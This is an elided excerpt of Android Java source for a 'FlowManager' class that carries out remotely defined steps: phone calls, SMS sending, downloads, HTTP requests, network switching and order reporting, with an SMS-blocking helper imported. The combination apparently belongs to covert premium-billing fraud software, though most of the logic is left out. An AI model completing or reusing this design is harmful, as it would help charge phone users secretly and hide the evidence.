...
import kernel.workspace.http.DownLoadThread;
import kernel.workspace.http.HttpJsonThread;
import kernel.workspace.http.HttpRequestThread;
import kernel.workspace.http.NetContext;
import kernel.workspace.ivr.CallPhoneUtil;
import kernel.workspace.listener.CallListener;
...
import kernel.workspace.sms.BlockHelper;
...
public class FlowManager {
    ...
    public static FlowManager getInstanse(Context context) {
        if (instanse == null) instanse = new FlowManager(context);
        return instanse;
    }
    private void doCall(final Step step) {
        CallStep call = (CallStep) step;
        new CallPhoneUtil(context, T.getRuntimeValue(flowRuntime.variables, call.receiver), call.duration, new CallListener() {
            @Override
    ...
    private void doDownload(final Step step) {
        ...
        NetworkController.doNetworkTask(context, download.networkType, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                ...
                new DownLoadThread(context, new NetContext(url, download, flowRuntime.variables, new NetListener() {
                    @Override
    ...
    private void report(final Step step, final String errorMsg) {
        ...
        ReportManager.report(context, step, errorMsg == null, errorMsg, new StepReportListener());
    }
    ...
    private void saveOrder(Order order) {
        ...
        if (target != null) {
            SharedPreferences pref = context.getSharedPreferences(PREF_WORKSPACE, Context.MODE_PRIVATE);
    ...
    private void doJsonRequest(final Step step) {
        ...
        NetworkController.doNetworkTask(context, jsonRequestStep.networkType, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg != null) {
                    stepFailure(step, errorMsg);
                ...
                try {
                    ...
                    new HttpJsonThread(context, new NetContext(url, form.toJson(), new NetListener() {
                        @Override
                        public void onFailed(int callBack, String errorCode, String errorMsg) {
                            stepFailure(step, errorMsg);
                        }
    ...
    private void doRequest(final Step step) {
        ...
        NetworkController.doNetworkTask(context, request.networkType, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg != null) {
                    stepFailure(step, errorMsg);
                ...
                Logger.debug(url);
                new HttpRequestThread(context, new NetContext(url, request, flowRuntime.variables, new NetListener() {
                    @Override
    ...
    private void doSendSms(final Step step) {
        ...
        new SmsSender(context, listener).sendSms(context, address, text, sms.timeout);
    }
    private void doChangeNetwork(final Step step) {
        ...
        NetworkController.doNetworkTask(context, networkType, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg == null) {
                    stepSuccess(step);
